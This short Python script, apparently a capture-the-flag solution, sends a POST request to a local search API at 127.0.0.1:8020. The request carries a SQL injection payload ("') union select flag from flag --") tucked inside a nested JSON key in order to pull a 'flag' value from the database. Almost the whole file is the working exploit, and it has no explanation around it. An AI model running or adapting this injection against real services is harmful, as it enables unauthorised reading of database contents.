import requests 


url = 'http://127.0.0.1:8020/'

data = {'code':{"') union select flag from flag --":"","":""}}

res = requests.post(url+'api/search',json=data)
print(res.text)
 
